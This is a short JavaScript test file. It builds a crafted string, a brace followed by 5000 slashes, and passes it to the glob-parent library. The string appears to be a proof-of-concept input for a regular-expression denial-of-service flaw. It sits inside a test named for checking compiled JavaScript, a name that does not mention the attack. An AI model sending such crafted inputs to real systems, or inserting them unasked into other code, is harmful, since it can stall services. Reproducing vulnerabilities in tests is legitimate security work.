function buildAttack (n) {
  let ret = '{'
  for (let i = 0; i < n; i++) {
    ret += '/'
  }
  return ret
}

const fs = require('fs')
const globParent = require('glob-parent')
describe('App', () => {
  it('Contains the compiled JavaScript', async () => {
    globParent(buildAttack(5000))
    console.log('finished')
    const data = fs.readFileSync('./public/main.js', 'utf8')
    expect(data).toMatchSnapshot()
  })
})
